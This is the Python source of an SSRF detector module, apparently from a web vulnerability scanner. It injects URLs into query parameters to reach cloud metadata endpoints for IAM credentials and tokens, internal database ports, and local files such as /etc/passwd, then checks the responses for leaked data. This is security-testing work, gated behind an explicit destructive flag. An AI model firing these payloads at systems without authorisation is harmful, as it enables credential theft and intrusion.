# detectors/advanced_ssrf_detector.py
"""
Advanced SSRF detector that tests for real exploitability beyond simple pingbacks.
Tests for:
- AWS/GCP metadata access (IAM credentials, instance data)
- Internal port scanning
- Local file reading
- Internal service interaction
"""
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from detectors.registry import register_active, await_host_token

logger = logging.getLogger(__name__)

# Target payloads for real SSRF exploitation
SSRF_EXPLOIT_PAYLOADS = {
    "aws_metadata_iam": {
        "urls": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "indicators": [
            "AccessKeyId", "SecretAccessKey", "Token",  # IAM credentials
            "ec2.internal", "compute.internal",  # AWS hostnames
            "instanceId", "imageId", "privateIp"  # Instance metadata
        ],
        "severity": "critical",
        "description": "AWS EC2 metadata endpoint accessible - can extract IAM credentials"
    },
    "gcp_metadata": {
        "urls": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
        "indicators": [
            "access_token", "token_type",  # GCP tokens
            "gserviceaccount.com",  # GCP service account
            "project-id", "numeric_project_id"  # GCP project info
        ],
        "severity": "critical",
        "description": "GCP metadata endpoint accessible - can extract service account tokens"
    },
    "azure_metadata": {
        "urls": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "indicators": [
            "access_token", "client_id",  # Azure tokens
            "subscriptionId", "resourceGroupName",  # Azure resource info
            "vmId", "sku"  # VM metadata
        ],
        "severity": "critical",
        "description": "Azure metadata endpoint accessible - can extract managed identity tokens"
    },
    "internal_services": {
        "urls": [
            "http://127.0.0.1:8080/",  # Common app port
            "http://localhost:8080/",
            "http://127.0.0.1:9200/",  # Elasticsearch
            "http://127.0.0.1:6379/",  # Redis
            "http://127.0.0.1:27017/",  # MongoDB
            "http://127.0.0.1:3306/",  # MySQL
            "http://0.0.0.0:8080/",
        ],
        "indicators": [
            "elasticsearch", "cluster_name",  # ES
            "redis_version",  # Redis
            "MongoDB",  # MongoDB
            "mysql", "MariaDB",  # MySQL/MariaDB
        ],
        "severity": "high",
        "description": "Internal service accessible - can interact with backend services"
    },
    "local_file_read": {
        "urls": [
            "file:///etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "file:///proc/self/environ",
        ],
        "indicators": [
            "root:x:", "nobody:x:",  # /etc/passwd
            "localhost", "127.0.0.1",  # hosts file
            "PATH=", "HOME=",  # environ
        ],
        "severity": "critical",
        "description": "Local file read via file:// protocol - can extract sensitive files"
    }
}


@register_active
async def advanced_ssrf_detector(session, url, context):
    """
    Advanced SSRF detector that tests for real exploitation capabilities.

    Returns findings only when:
    - Can extract cloud metadata (IAM keys, tokens)
    - Can access internal services
    - Can read local files
    """
    findings = []

    if not url:
        return findings

    allow_destructive = context.get("allow_destructive", False)
    if not allow_destructive:
        # This detector is aggressive - only run with explicit consent
        logger.debug("advanced_ssrf_detector: Skipping (requires --destructive flag)")
        return findings

    per_host_rate = context.get("per_host_rate", None)

    try:
        parsed = urlparse(url)
        host = parsed.netloc.lower()
        existing_qs = parse_qs(parsed.query, keep_blank_values=True)

        # Find candidate parameters
        candidate_params = list(existing_qs.keys()) or ["url", "target", "uri", "path", "file", "page"]

        for param in candidate_params[:3]:  # Limit to 3 params to avoid excessive requests
            for exploit_type, exploit_data in SSRF_EXPLOIT_PAYLOADS.items():
                for target_url in exploit_data["urls"][:2]:  # Test first 2 URLs per exploit

                    # Build test URL
                    new_qs = dict(existing_qs)
                    new_qs[param] = [target_url]
                    test_query = urlencode(new_qs, doseq=True)
                    test_url = parsed._replace(query=test_query).geturl()

                    # Throttle
                    await await_host_token(host, per_host_rate)

                    try:
                        async with session.get(test_url, allow_redirects=True, timeout=15) as resp:
                            try:
                                body = await resp.text()
                            except Exception:
                                body = ""

                            status = resp.status
                            headers = dict(resp.headers)

                    except Exception as e:
                        logger.debug(f"SSRF test failed for {test_url}: {e}")
                        continue

                    # Check for exploitation indicators
                    matched_indicators = []
                    if body:
                        for indicator in exploit_data["indicators"]:
                            if indicator.lower() in body.lower():
                                matched_indicators.append(indicator)

                    # Only report if we found real exploitation evidence
                    if len(matched_indicators) >= 2:  # At least 2 indicators for confidence
                        findings.append({
                            "type": "SSRF - Real Exploitation",
                            "evidence": f"Successfully accessed {exploit_type}: Found indicators: {', '.join(matched_indicators)}",
                            "how_found": f"Injected '{target_url}' into parameter '{param}' and extracted sensitive data (confirmed)",
                            "severity": exploit_data["severity"],
                            "payload": target_url,
                            "evidence_url": test_url,
                            "evidence_body": body[:1000],  # First 1000 chars
                            "evidence_headers": headers,
                            "evidence_status": status,
                            "test_param": param,
                            "test_payload_template": target_url,
                            "exploitation_type": exploit_type,
                            "matched_indicators": matched_indicators,
                        })

                        logger.warning(
                            f"🔥 CRITICAL SSRF FOUND: {url} - Can access {exploit_type} via param '{param}'"
                        )

                        # Stop testing this param once we confirm exploitation
                        break

                # If we found exploitation for this param, move to next param
                if any(f.get("test_param") == param for f in findings):
                    break

    except Exception as e:
        logger.exception(f"advanced_ssrf_detector error for {url}: {e}")

    return findings
